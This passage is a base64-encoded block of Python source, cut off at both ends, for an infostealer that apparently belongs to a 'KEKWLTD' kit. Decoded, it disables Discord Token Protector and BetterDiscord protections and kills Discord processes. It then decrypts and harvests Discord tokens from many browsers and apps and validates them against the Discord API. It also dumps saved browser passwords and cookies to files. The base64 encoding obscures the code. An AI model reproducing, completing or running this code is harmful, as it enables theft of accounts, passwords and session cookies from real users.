fbWF0Y2hlZF90b2tlbnMoKQogICAgICAgIHNlbGYucGluZ19vbl9ydW5uaW5nKCkKICAgICAgICBzZWxmLmZpbmlzaGVkX2JjKCkKCiAgICAKICAgIGFzeW5jIGRlZiBieXBhc3NfdG9rZW5wcnRjdChzZWxmKToKICAgICAgICB0cCA9IGYie3NlbGYucm9hbWluZ31cXERpc2NvcmRUb2tlblByb3RlY3RvclxcIgogICAgICAgIGlmIG5vdCBudHBhdGguZXhpc3RzKHRwKToKICAgICAgICAgICAgcmV0dXJuCiAgICAgICAgY29uZmlnID0gdHAgKyAiY29uZmlnLmpzb24iCgogICAgICAgIGZvciBpIGluIFsiRGlzY29yZFRva2VuUHJvdGVjdG9yLmV4ZSIsICJQcm90ZWN0aW9uUGF5bG9hZC5kbGwiLCAic2VjdXJlLmRhdCJdOgogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICBvcy5yZW1vdmUodHAgKyBpKQogICAgICAgICAgICBleGNlcHQgRmlsZU5vdEZvdW5kRXJyb3I6CiAgICAgICAgICAgICAgICBwYXNzCiAgICAgICAgaWYgbnRwYXRoLmV4aXN0cyhjb25maWcpOgogICAgICAgICAgICB3aXRoIG9wZW4oY29uZmlnLCBlcnJvcnM9Imlnbm9yZSIpIGFzIGY6CiAgICAgICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICAgICAgaXRlbSA9IGpzb24ubG9hZChmKQogICAgICAgICAgICAgICAgZXhjZXB0IGpzb24uZGVjb2Rlci5KU09ORGVjb2RlRXJyb3I6CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuCiAgICAgICAgICAgICAgICBpdGVtWydrZWt3X2lzX2hlcmUnXSA9ICJodHRwczovL2tla3dsdGQucnUiCiAgICAgICAgICAgICAgICBpdGVtWydhdXRvX3N0YXJ0J10gPSBGYWxzZQogICAgICAgICAgICAgICAgaXRlbVsnYXV0b19zdGFydF9kaXNjb3JkJ10gPSBGYWxzZQogICAgICAgICAgICAgICAgaXRlbVsnaW50ZWdyaXR5J10gPSBGYWxzZQogICAgICAgICAgICAgICAgaXRlbVsnaW50ZWdyaXR5X2FsbG93YmV0dGVyZGlzY29yZCddID0gRmFsc2UKICAgICAgICAgICAgICAgIGl0ZW1bJ2ludGVncml0eV9jaGVja2V4ZWN1dGFibGUnXSA9IEZhbHNlCiAgICAgICAgICAgICAgICBpdGVtWydpbnRlZ3JpdHlfY2hlY2toYXNoJ10gPSBGYWxzZQogICAgICAgICAgICAgICAgaXRlbVsnaW50ZWdyaXR5X2NoZWNrbW9kdWxlJ10gPSBGYWxzZQogICAgICAgICAgICAgICAgaXRlbVsnaW50ZWdyaXR5X2NoZWNrc2NyaXB0cyddID0gRmFsc2UKICAgICAgICAgICAgICAgIGl0ZW1bJ2ludGVncml0eV9jaGVja3Jlc291cmNlJ10gPSBGYWxzZQogICAgICAgICAgICAgICAgaXRlbVsnaW50ZWdyaXR5X3JlZG93bmxvYWRoYXNoZXMnXSA9IEZhbHNlCiAgICAgICAgICAgICAgICBpdGVtWydpdGVyYXRpb25zX2l2J10gPSAzNjQKICAgICAgICAgICAgICAgIGl0ZW1bJ2l0ZXJhdGlvbnNfa2V5J10gPSA0NTcKICAgICAgICAgICAgICAgIGl0ZW1bJ3ZlcnNpb24nXSA9IDY5NDIwCiAgICAgICAgICAgIHdpdGggb3Blbihjb25maWcsICd3JykgYXMgZjoKICAgICAgICAgICAgICAgIGpzb24uZHVtcChpdGVtLCBmLCBpbmRlbnQ9Miwgc29ydF9rZXlzPVRydWUpCiAgICAgICAgICAgIHdpdGggb3Blbihjb25maWcsICdhJykgYXMgZjoKICAgICAgICAgICAgICAgIGYud3JpdGUoIlxuXG4vL0tFS1dMVEQgfCBodHRwczovL2tla3dsdGQucnUiKQoKICAgIGFzeW5jIGRlZiBraWxsX3Byb2Nlc3NfaWQoc2VsZik6CiAgICAgICAgYmxsaXN0ID0gc2VsZi5mZXRjaF9jb25mKCdibHByZ2dnJykKICAgICAgICBmb3IgaSBpbiBbJ2Rpc2NvcmQnLCAnZGlzY29yZHRva2VucHJvdGVjdG9yJywgJ2Rpc2NvcmRjYW5hcnknLCAnZGlzY29yZGRldmVsb3BtZW50JywgJ2Rpc2NvcmRwdGInXToKICAgICAgICAgICAgYmxsaXN0LmFwcGVuZChpKQogICAgICAgIGZvciBwcm9jIGluIHBzdXRpbC5wcm9jZXNzX2l0ZXIoKToKICAgICAgICAgICAgaWYgYW55KHByb2NzdHIgaW4gcHJvYy5uYW1lKCkubG93ZXIoKSBmb3IgcHJvY3N0ciBpbiBibGxpc3QpOgogICAgICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgICAgIHByb2Mua2lsbCgpCiAgICAgICAgICAgICAgICBleGNlcHQgKHBzdXRpbC5Ob1N1Y2hQcm9jZXNzLCBwc3V0aWwuQWNjZXNzRGVuaWVkKToKICAgICAgICAgICAgICAgICAgICBwYXNzCgoKICAgIGFzeW5jIGRlZiBieXBhc3NfYnR0ZHNjKHNlbGYpOgogICAgICAgIGJkID0gc2VsZi5yb2FtaW5nICsgIlxcQmV0dGVyRGlzY29yZFxcZGF0YVxcYmV0dGVyZGlzY29yZC5hc2FyIgogICAgICAgIGlmIG50cGF0aC5leGlzdHMoYmQpOgogICAgICAgICAgICB4ID0gc2VsZi5yZWdleF93ZWJob29rX2RzYwogICAgICAgICAgICB3aXRoIG9wZW4oYmQsICdyJywgZW5jb2Rpbmc9ImNwNDM3IiwgZXJyb3JzPSdpZ25vcmUnKSBhcyBmOgogICAgICAgICAgICAgICAgdHh0ID0gZi5yZWFkKCkKICAgICAgICAgICAgICAgIGNvbnRlbnQgPSB0eHQucmVwbGFjZSh4LCAna2Vrd2x0ZCcpCiAgICAgICAgICAgIHdpdGggb3BlbihiZCwgJ3cnLCBuZXdsaW5lPScnLCBlbmNvZGluZz0iY3A0MzciLCBlcnJvcnM9J2lnbm9yZScpIGFzIGY6CiAgICAgICAgICAgICAgICBmLndyaXRlKGNvbnRlbnQpCgogICAgQGV4dHJhY3RfdHJ5CiAgICBkZWYgZGVjcnlwdF92YWwoc2VsZiwgYnVmZiwgbWFzdGVyX2tleSk6CiAgICAgICAgdHJ5OgogICAgICAgICAgICBpdiA9IGJ1ZmZbMzoxNV0KICAgICAgICAgICAgcGF5bG9hZCA9IGJ1ZmZbMTU6XQogICAgICAgICAgICBjaXBoZXIgPSBBRVMubmV3KG1hc3Rlcl9rZXksIEFFUy5NT0RFX0dDTSwgaXYpCiAgICAgICAgICAgIGRlY3J5cHRlZF9wYXNzID0gY2lwaGVyLmRlY3J5cHQocGF5bG9hZCkKICAgICAgICAgICAgZGVjcnlwdGVkX3Bhc3MgPSBkZWNyeXB0ZWRfcGFzc1s6LTE2XS5kZWNvZGUoKQogICAgICAgICAgICByZXR1cm4gZGVjcnlwdGVkX3Bhc3MKICAgICAgICBleGNlcHQgRXhjZXB0aW9uOgogICAgICAgICAgICByZXR1cm4gIkZhaWxlZCB0byBkZWNyeXB0IHBhc3N3b3JkIgoKICAgIGRlZiBnZXRfbWFzdGVyX2tleShzZWxmLCBwYXRoKToKICAgICAgICB3aXRoIG9wZW4ocGF0aCwgInIiLCBlbmNvZGluZz0idXRmLTgiKSBhcyBmOgogICAgICAgICAgICBjID0gZi5yZWFkKCkKICAgICAgICBsb2NhbF9zdGF0ZSA9IGpzb24ubG9hZHMoYykKICAgICAgICBtYXN0ZXJfa2V5ID0gYmFzZTY0LmI2NGRlY29kZShsb2NhbF9zdGF0ZVsib3NfY3J5cHQiXVsiZW5jcnlwdGVkX2tleSJdKQogICAgICAgIG1hc3Rlcl9rZXkgPSBtYXN0ZXJfa2V5WzU6XQogICAgICAgIG1hc3Rlcl9rZXkgPSBDcnlwdFVucHJvdGVjdERhdGEobWFzdGVyX2tleSwgTm9uZSwgTm9uZSwgTm9uZSwgMClbMV0KICAgICAgICByZXR1cm4gbWFzdGVyX2tleQoKICAgIGRlZiBzdGVhbF90b2tlbihzZWxmKToKICAgICAgICBwYXRocyA9IHsKICAgICAgICAgICAgJ0Rpc2NvcmQnOiBzZWxmLnJvYW1pbmcgKyAnXFxkaXNjb3JkXFxMb2NhbCBTdG9yYWdlXFxsZXZlbGRiXFwnLAogICAgICAgICAgICAnRGlzY29yZCBDYW5hcnknOiBzZWxmLnJvYW1pbmcgKyAnXFxkaXNjb3JkY2FuYXJ5XFxMb2NhbCBTdG9yYWdlXFxsZXZlbGRiXFwnLAogICAgICAgICAgICAnTGlnaHRjb3JkJzogc2VsZi5yb2FtaW5nICsgJ1xcTGlnaHRjb3JkXFxMb2NhbCBTdG9yYWdlXFxsZXZlbGRiXFwnLAogICAgICAgICAgICAnRGlzY29yZCBQVEInOiBzZWxmLnJvYW1pbmcgKyAnXFxkaXNjb3JkcHRiXFxMb2NhbCBTdG9yYWdlXFxsZXZlbGRiXFwnLAogICAgICAgICAgICAnT3BlcmEnOiBzZWxmLnJvYW1pbmcgKyAnXFxPcGVyYSBTb2Z0d2FyZVxcT3BlcmEgU3RhYmxlXFxMb2NhbCBTdG9yYWdlXFxsZXZlbGRiXFwnLAogICAgICAgICAgICAnT3BlcmEgR1gnOiBzZWxmLnJvYW1pbmcgKyAnXFxPcGVyYSBTb2Z0d2FyZVxcT3BlcmEgR1ggU3RhYmxlXFxMb2NhbCBTdG9yYWdlXFxsZXZlbGRiXFwnLAogICAgICAgICAgICAnQW1pZ28nOiBzZWxmLmFwcGRhdGEgKyAnXFxBbWlnb1xcVXNlciBEYXRhXFxMb2NhbCBTdG9yYWdlXFxsZXZlbGRiXFwnLAogICAgICAgICAgICAnVG9yY2gnOiBzZWxmLmFwcGRhdGEgKyAnXFxUb3JjaFxcVXNlciBEYXRhXFxMb2NhbCBTdG9yYWdlXFxsZXZlbGRiXFwnLAogICAgICAgICAgICAnS29tZXRhJzogc2VsZi5hcHBkYXRhICsgJ1xcS29tZXRhXFxVc2VyIERhdGFcXExvY2FsIFN0b3JhZ2VcXGxldmVsZGJcXCcsCiAgICAgICAgICAgICdPcmJpdHVtJzogc2VsZi5hcHBkYXRhICsgJ1xcT3JiaXR1bVxcVXNlciBEYXRhXFxMb2NhbCBTdG9yYWdlXFxsZXZlbGRiXFwnLAogICAgICAgICAgICAnQ2VudEJyb3dzZXInOiBzZWxmLmFwcGRhdGEgKyAnXFxDZW50QnJvd3NlclxcVXNlciBEYXRhXFxMb2NhbCBTdG9yYWdlXFxsZXZlbGRiXFwnLAogICAgICAgICAgICAnN1N0YXInOiBzZWxmLmFwcGRhdGEgKyAnXFw3U3RhclxcN1N0YXJcXFVzZXIgRGF0YVxcTG9jYWwgU3RvcmFnZVxcbGV2ZWxkYlxcJywKICAgICAgICAgICAgJ1NwdXRuaWsnOiBzZWxmLmFwcGRhdGEgKyAnXFxTcHV0bmlrXFxTcHV0bmlrXFxVc2VyIERhdGFcXExvY2FsIFN0b3JhZ2VcXGxldmVsZGJcXCcsCiAgICAgICAgICAgICdWaXZhbGRpJzogc2VsZi5hcHBkYXRhICsgJ1xcVml2YWxkaVxcVXNlciBEYXRhXFxEZWZhdWx0XFxMb2NhbCBTdG9yYWdlXFxsZXZlbGRiXFwnLAogICAgICAgICAgICAnQ2hyb21lIFN4Uyc6IHNlbGYuYXBwZGF0YSArICdcXEdvb2dsZVxcQ2hyb21lIFN4U1xcVXNlciBEYXRhXFxMb2NhbCBTdG9yYWdlXFxsZXZlbGRiXFwnLAogICAgICAgICAgICAnQ2hyb21lJzogc2VsZi5hcHBkYXRhICsgJ1xcR29vZ2xlXFxDaHJvbWVcXFVzZXIgRGF0YVxcRGVmYXVsdFxcTG9jYWwgU3RvcmFnZVxcbGV2ZWxkYlxcJywKICAgICAgICAgICAgJ0Nocm9tZTEnOiBzZWxmLmFwcGRhdGEgKyAnXFxHb29nbGVcXENocm9tZVxcVXNlciBEYXRhXFxQcm9maWxlIDFcXExvY2FsIFN0b3JhZ2VcXGxldmVsZGJcXCcsCiAgICAgICAgICAgICdDaHJvbWUyJzogc2VsZi5hcHBkYXRhICsgJ1xcR29vZ2xlXFxDaHJvbWVcXFVzZXIgRGF0YVxcUHJvZmlsZSAyXFxMb2NhbCBTdG9yYWdlXFxsZXZlbGRiXFwnLAogICAgICAgICAgICAnQ2hyb21lMyc6IHNlbGYuYXBwZGF0YSArICdcXEdvb2dsZVxcQ2hyb21lXFxVc2VyIERhdGFcXFByb2ZpbGUgM1xcTG9jYWwgU3RvcmFnZVxcbGV2ZWxkYlxcJywKICAgICAgICAgICAgJ0Nocm9tZTQnOiBzZWxmLmFwcGRhdGEgKyAnXFxHb29nbGVcXENocm9tZVxcVXNlciBEYXRhXFxQcm9maWxlIDRcXExvY2FsIFN0b3JhZ2VcXGxldmVsZGJcXCcsCiAgICAgICAgICAgICdDaHJvbWU1Jzogc2VsZi5hcHBkYXRhICsgJ1xcR29vZ2xlXFxDaHJvbWVcXFVzZXIgRGF0YVxcUHJvZmlsZSA1XFxMb2NhbCBTdG9yYWdlXFxsZXZlbGRiXFwnLAogICAgICAgICAgICAnRXBpYyBQcml2YWN5IEJyb3dzZXInOiBzZWxmLmFwcGRhdGEgKyAnXFxFcGljIFByaXZhY3kgQnJvd3NlclxcVXNlciBEYXRhXFxMb2NhbCBTdG9yYWdlXFxsZXZlbGRiXFwnLAogICAgICAgICAgICAnTWljcm9zb2Z0IEVkZ2UnOiBzZWxmLmFwcGRhdGEgKyAnXFxNaWNyb3NvZnRcXEVkZ2VcXFVzZXIgRGF0YVxcRGVmYXVsXFxMb2NhbCBTdG9yYWdlXFxsZXZlbGRiXFwnLAogICAgICAgICAgICAnVXJhbic6IHNlbGYuYXBwZGF0YSArICdcXHVDb3pNZWRpYVxcVXJhblxcVXNlciBEYXRhXFxEZWZhdWx0XFxMb2NhbCBTdG9yYWdlXFxsZXZlbGRiXFwnLAogICAgICAgICAgICAnWWFuZGV4Jzogc2VsZi5hcHBkYXRhICsgJ1xcWWFuZGV4XFxZYW5kZXhCcm93c2VyXFxVc2VyIERhdGFcXERlZmF1bHRcXExvY2FsIFN0b3JhZ2VcXGxldmVsZGJcXCcsCiAgICAgICAgICAgICdCcmF2ZSc6IHNlbGYuYXBwZGF0YSArICdcXEJyYXZlU29mdHdhcmVcXEJyYXZlLUJyb3dzZXJcXFVzZXIgRGF0YVxcRGVmYXVsdFxcTG9jYWwgU3RvcmFnZVxcbGV2ZWxkYlxcJywKICAgICAgICAgICAgJ0lyaWRpdW0nOiBzZWxmLmFwcGRhdGEgKyAnXFxJcmlkaXVtXFxVc2VyIERhdGFcXERlZmF1bHRcXExvY2FsIFN0b3JhZ2VcXGxldmVsZGJcXCd9CgogICAgICAgIGZvciBuYW1lLCBwYXRoIGluIHBhdGhzLml0ZW1zKCk6CiAgICAgICAgICAgIGlmIG5vdCBvcy5wYXRoLmV4aXN0cyhwYXRoKToKICAgICAgICAgICAgICAgIGNvbnRpbnVlCiAgICAgICAgICAgIGRpc2MgPSBuYW1lLnJlcGxhY2UoIiAiLCAiIikubG93ZXIoKQogICAgICAgICAgICBpZiAiY29yZCIgaW4gcGF0aDoKICAgICAgICAgICAgICAgIGlmIG9zLnBhdGguZXhpc3RzKHNlbGYucm9hbWluZyArIGYnXFx7ZGlzY31cXExvY2FsIFN0YXRlJyk6CiAgICAgICAgICAgICAgICAgICAgZm9yIGZpbG5hbWUgaW4gb3MubGlzdGRpcihwYXRoKToKICAgICAgICAgICAgICAgICAgICAgICAgaWYgZmlsbmFtZVstMzpdIG5vdCBpbiBbImxvZyIsICJsZGIiXToKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlCiAgICAgICAgICAgICAgICAgICAgICAgIGZvciBsaW5lIGluIFt4LnN0cmlwKCkgZm9yIHggaW4gb3BlbihmJ3twYXRofVxce2ZpbG5hbWV9JywgZXJyb3JzPSdpZ25vcmUnKS5yZWFkbGluZXMoKSBpZiB4LnN0cmlwKCldOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgZm9yIHkgaW4gcmUuZmluZGFsbChzZWxmLmVuY3J5cHRlZF9yZWdleCwgbGluZSk6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0b2tlbiA9IHNlbGYuZGVjcnlwdF92YWwoYmFzZTY0LmI2NGRlY29kZSh5LnNwbGl0KCdkUXc0dzlXZ1hjUTonKVsxXSksIHNlbGYuZ2V0X21hc3Rlcl9rZXkoc2VsZi5yb2FtaW5nICsgZidcXHtkaXNjfVxcTG9jYWwgU3RhdGUnKSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBleGNlcHQgVmFsdWVFcnJvcjoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcGFzcwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgciA9IHJlcXVlc3RzLmdldChzZWxmLmJhc2V1cmwsIGhlYWRlcnM9ewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ1VzZXItQWdlbnQnOiAnTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzgwLjAuMzk4Ny4xNDkgU2FmYXJpLzUzNy4zNicsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnQ29udGVudC1UeXBlJzogJ2FwcGxpY2F0aW9uL2pzb24nLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ0F1dGhvcml6YXRpb24nOiB0b2tlbn0pCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbjoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcGFzcwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIHIuc3RhdHVzX2NvZGUgPT0gMjAwOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB1aWQgPSByLmpzb24oKVsnaWQnXQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiB1aWQgbm90IGluIHNlbGYuYmNfaWQ6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzZWxmLnRva2Vucy5hcHBlbmQodG9rZW4pCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzZWxmLmJjX2lkLmFwcGVuZCh1aWQpCiAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICBmb3IgZmlsbmFtZSBpbiBvcy5saXN0ZGlyKHBhdGgpOgogICAgICAgICAgICAgICAgICAgIGlmIGZpbG5hbWVbLTM6XSBub3QgaW4gWyJsb2ciLCAibGRiIl06CiAgICAgICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlCiAgICAgICAgICAgICAgICAgICAgZm9yIGxpbmUgaW4gW3guc3RyaXAoKSBmb3IgeCBpbiBvcGVuKGYne3BhdGh9XFx7ZmlsbmFtZX0nLCBlcnJvcnM9J2lnbm9yZScpLnJlYWRsaW5lcygpIGlmIHguc3RyaXAoKV06CiAgICAgICAgICAgICAgICAgICAgICAgIGZvciB0b2tlbiBpbiByZS5maW5kYWxsKHNlbGYucmVnZXgsIGxpbmUpOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHIgPSByZXF1ZXN0cy5nZXQoc2VsZi5iYXNldXJsLCBoZWFkZXJzPXsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ1VzZXItQWdlbnQnOiAnTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzgwLjAuMzk4Ny4xNDkgU2FmYXJpLzUzNy4zNicsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdDb250ZW50LVR5cGUnOiAnYXBwbGljYXRpb24vanNvbicsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdBdXRob3JpemF0aW9uJzogdG9rZW59KQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbjoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwYXNzCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiByLnN0YXR1c19jb2RlID09IDIwMDoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB1aWQgPSByLmpzb24oKVsnaWQnXQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIHVpZCBub3QgaW4gc2VsZi5iY19pZDoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi50b2tlbnMuYXBwZW5kKHRva2VuKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzZWxmLmJjX2lkLmFwcGVuZCh1aWQpCgogICAgICAgIGlmIG9zLnBhdGguZXhpc3RzKHNlbGYucm9hbWluZyArICJcXE1vemlsbGFcXEZpcmVmb3hcXFByb2ZpbGVzIik6CiAgICAgICAgICAgIGZvciBwYXRoLCBfLCBmaWxlcyBpbiBvcy53YWxrKHNlbGYucm9hbWluZyArICJcXE1vemlsbGFcXEZpcmVmb3hcXFByb2ZpbGVzIik6CiAgICAgICAgICAgICAgICBmb3IgX2ZpbGUgaW4gZmlsZXM6CiAgICAgICAgICAgICAgICAgICAgaWYgbm90IF9maWxlLmVuZHN3aXRoKCcuc3FsaXRlJyk6CiAgICAgICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlCiAgICAgICAgICAgICAgICAgICAgZm9yIGxpbmUgaW4gW3guc3RyaXAoKSBmb3IgeCBpbiBvcGVuKGYne3BhdGh9XFx7X2ZpbGV9JywgZXJyb3JzPSdpZ25vcmUnKS5yZWFkbGluZXMoKSBpZiB4LnN0cmlwKCldOgogICAgICAgICAgICAgICAgICAgICAgICBmb3IgdG9rZW4gaW4gcmUuZmluZGFsbChzZWxmLnJlZ2V4LCBsaW5lKToKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICByID0gcmVxdWVzdHMuZ2V0KHNlbGYuYmFzZXVybCwgaGVhZGVycz17CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdVc2VyLUFnZW50JzogJ01vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS84MC4wLjM5ODcuMTQ5IFNhZmFyaS81MzcuMzYnLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnQ29udGVudC1UeXBlJzogJ2FwcGxpY2F0aW9uL2pzb24nLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnQXV0aG9yaXphdGlvbic6IHRva2VufSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb246CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcGFzcwogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgci5zdGF0dXNfY29kZSA9PSAyMDA6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdWlkID0gci5qc29uKClbJ2lkJ10KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiB1aWQgbm90IGluIHNlbGYuYmNfaWQ6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYudG9rZW5zLmFwcGVuZCh0b2tlbikKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi5iY19pZC5hcHBlbmQodWlkKQoKCgoKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAoKICAgIGRlZiByYW5kb21fZGlyX2NyZWF0ZShzZWxmLCBfZGlyOiBzdHIgb3Igb3MuUGF0aExpa2UgPSBnZXR0ZW1wZGlyKCkpOgogICAgICAgIGZpbG5hbWUgPSAnJy5qb2luKHJhbmRvbS5TeXN0ZW1SYW5kb20oKS5jaG9pY2UoJ2FiY2RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVowMTIzNDU2Nzg5JykgZm9yIF8gaW4gcmFuZ2UocmFuZG9tLnJhbmRpbnQoMTAsIDIwKSkpCiAgICAgICAgcGF0aCA9IG9zLnBhdGguam9pbihfZGlyLCBmaWxuYW1lKQogICAgICAgIG9wZW4ocGF0aCwgIngiKQogICAgICAgIHJldHVybiBwYXRoCgoKICAgIEBleHRyYWN0X3RyeQogICAgZGVmIHN0ZWFsX3Bhc3N3b3JkczIoc2VsZiwgbmFtZTogc3RyLCBwYXRoOiBzdHIsIHByb2ZpbGU6IHN0cik6CiAgICAgICAgcGF0aCArPSAnXFwnICsgcHJvZmlsZSArICdcXExvZ2luIERhdGEnCiAgICAgICAgaWYgbm90IG9zLnBhdGguaXNmaWxlKHBhdGgpOgogICAgICAgICAgICByZXR1cm4KCiAgICAgICAgbG9naW52YXVsdCA9IHNlbGYucmFuZG9tX2Rpcl9jcmVhdGUoKQogICAgICAgIGNvcHkyKHBhdGgsIGxvZ2ludmF1bHQpCiAgICAgICAgY29ubiA9IHNxbGl0ZTMuY29ubmVjdChsb2dpbnZhdWx0KQogICAgICAgIGN1cnNvciA9IGNvbm4uY3Vyc29yKCkKICAgICAgICB3aXRoIG9wZW4ob3MucGF0aC5qb2luKHNlbGYuZGlyLCAiQnJvd3NlcnMiLCAiQWxsIFBhc3N3b3Jkcy50eHQiKSwgJ2EnLCBlbmNvZGluZz0idXRmLTgiKSBhcyBmOgogICAgICAgICAgICBmb3IgcmVzIGluIGN1cnNvci5leGVjdXRlKCJTRUxFQ1Qgb3JpZ2luX3VybCwgdXNlcm5hbWVfdmFsdWUsIHBhc3N3b3JkX3ZhbHVlIEZST00gbG9naW5zIikuZmV0Y2hhbGwoKToKICAgICAgICAgICAgICAgIHVybCwgdXNlcm5hbWUsIHBhc3N3b3JkID0gcmVzCiAgICAgICAgICAgICAgICBwYXNzd29yZCA9IHNlbGYuZGNycHRfdmFsKHBhc3N3b3JkLCBzZWxmLm1hc3RlcmtleSkKICAgICAgICAgICAgICAgIGlmIHVybCAhPSAiIjoKICAgICAgICAgICAgICAgICAgICBmLndyaXRlKGYiVVJMOiB7dXJsfVxuSUQ6IHt1c2VybmFtZX1cblBBU1NXMFJEOiB7cGFzc3dvcmR9XG5cbiIpCiAgICAgICAgY3Vyc29yLmNsb3NlKCkKICAgICAgICBjb25uLmNsb3NlKCkKICAgICAgICBvcy5yZW1vdmUobG9naW52YXVsdCkKCiAgICBAZXh0cmFjdF90cnkKICAgIGRlZiBzdGVhbF9jb29raWVzMihzZWxmLCBuYW1lOiBzdHIsIHBhdGg6IHN0ciwgcHJvZmlsZTogc3RyKToKICAgICAgICBwYXRoICs9ICdcXCcgKyBwcm9maWxlICsgJ1xcTmV0d29ya1xcQ29va2llcycKICAgICAgICBpZiBub3Qgb3MucGF0aC5pc2ZpbGUocGF0aCk6CiAgICAgICAgICAgIHJldHVybgogICAgICAgIGNvb2tpZXZhdWx0ID0gc2VsZi5yYW5kb21fZGlyX2NyZWF0ZSgpCiAgICAgICAgY29weTIocGF0aCwgY29va2lldmF1bHQpCiAgICAgICAgY29ubiA9IHNxbGl0ZTMuY29ubmVjdChjb29raWV2YXVsdCkKICAgICAgICBjdXJzb3IgPSBjb25uLmN1cnNvcigpCiAgICAgICAgd2l0aCBvcGVuKG9zLnBhdGguam9pbihzZWxmLmRpciwgIkJyb3dzZXJzIiwgIkFsbCBDb29raWVzLnR4dCIpLCAnYScsIGVuY29kaW5nPSJ1dGYtOCIpIGFzIGY6CiAgICAgICAgICAgIGZvciByZXMgaW4gY3Vyc29yLmV4ZWN1dGUoIlNFTEVDVCBob3N0X2tleSwgbmFtZSwgcGF0aCwgZW5jcnlwdGVkX3ZhbHVlLGV4cGlyZXNfdXRjIEZST00gY29va2llcyIpLmZldGNoYWxsKCk6CiAgICAgICAgICAgICAgICBob3N0X2tleSwgbmFtZSwgcGF0aCwgZW5jcnlwdGVkX3ZhbHVlLCBleHBpcmVzX3V0YyA9IHJlcwogICAgICAgICAgICAgICAgdmFsdWUgPSBzZWxmLmRjcnB0X3ZhbChlbmNyeXB0ZWRfdmFsdWUsIHNlbGYubWFzdGVya2V5KQogICAgICAgICAgICAgICAgaWYgaG9zdF9rZXkgYW5kIG5hbWUgYW5kIHZhbHVlICE9ICIiOgogICAgICAgICAgICAgICAgICAgIGYud3JpdGUoInt9XHR7fVx0e31cdHt9XHR7fVx0e31cdHt9XG4iLmZvcm1hdCgKICAgICAgICAgICAgICAgICAgICAgICAgaG9zdF9rZXksICdGQUxTRScgaWYgZXhwaXJlc191dGMgPT0gMCBlbHNlICdUUlVFJywgcGF0aCwgJ0ZBTFNFJyBpZiBob3N0X2tleS5zdGFydHN3aXRoKCcuJykgZWxzZSAnVFJVRScsIGV4cGlyZXNfdXRjLCBuYW1lLCB2YWx1ZSkpCiAgICAgICAgY3Vyc29yLmNsb3NlKCkKICAgICAgICBjb25uLmNsb3NlKCkKICAgICAgICBvcy5yZW1vdmUoY29va2lldmF1bHQpCgoKCgoKCgoKICAgIEBleHRyYWN